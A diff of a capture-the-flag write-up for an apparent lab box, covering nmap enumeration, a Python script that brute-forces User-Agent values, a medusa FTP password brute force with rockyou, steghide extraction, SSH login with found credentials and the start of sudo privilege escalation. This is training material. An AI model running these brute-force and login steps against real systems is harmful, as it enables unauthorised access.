@@ -8,7 +8,7 @@
 
 ## Enumeration
 
-- Nmap initial
+### Nmap
 
 1. 21/tcp open ftp syn-ack vsftpd 3.0.3
 2. 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -16,8 +16,9 @@
 
 - ftp -> anonymous login not allowed
 
-- http
-- home page
+### HTTP
+
+- at home page
 
 ```
 Use your own codename as user-agent to access the site.
@@ -29,6 +30,28 @@ Agent R
 - what is codename??
 - from text, Agent R, try to brute force from A-Z with user-agent header
 - find agent C,
+- I write this script to find
+```python
+import requests 
+import string
+
+out_file = ""
+
+s = requests.Session()
+for char in string.ascii_uppercase:
+    url = 'http://10.10.218.47/index.php'
+    header = {
+        "User-Agent": char
+    }
+    r = s.get(url, headers=header)
+    out_file += char + '\n' + '======' + '\n' + r.text + '\n'
+    print(f'{char} -> {len(r.content)}, {r.status_code}')
+
+with open('agent_find.txt', 'w') as f:
+    f.write(out_file)
+
+print('Done')
+```
 
 ```
 C
@@ -41,15 +64,15 @@ From,<br>
 Agent R
 ```
 
-- then brute force ftp password with user christ
+- then brute force ftp password with user chris
 
 ```sh
 $ medusa -h $IP -u chris -P /usr/share/wordlists/rockyou.txt -M ftp -t 8
 ```
 
-- ACCOUNT FOUND: [ftp] Host: 10.10.218.47 User: chris Password: crystal [SUCCESS]
+- `ACCOUNT FOUND: [ftp] Host: 10.10.218.47 User: chris Password: xxxxxxx [SUCCESS]`
 
-- login with chris:crystal to ftp server
+- login with chris:xxxxxxx to ftp server
 - get three files
 - in text file
 
@@ -108,12 +131,14 @@ We need to send the picture to 'QXJlYTUx' as soon as possible!
 By,
 Agent R
 ```
+- use steghide to extract from `cute-alien.jpg` 
+- this doesn't work and try to encode with base64
 
 ```sh
 $ echo QXJlYTUx | base64 -d
-# Area51
+# xxxxxx
 $ steghide extract -sf cute-alien.jpg
-Enter passphrase: Area51
+Enter passphrase: xxxxxx
 wrote extracted data to "message.txt".
 ```
 
@@ -130,6 +155,8 @@ Your buddy,
 chris
 ```
 
+## User Access
+
 - enter ssh with james:hackerrules!
 
 ```sh
@@ -142,6 +169,8 @@ Matching Defaults entries for james on agent-sudo:
 User james may run the following commands on agent-sudo:
     (ALL, !root) /bin/bash
 ```
+
+## Root Access
 
 ```sh
 james@agent-sudo:/tmp$ sudo --version
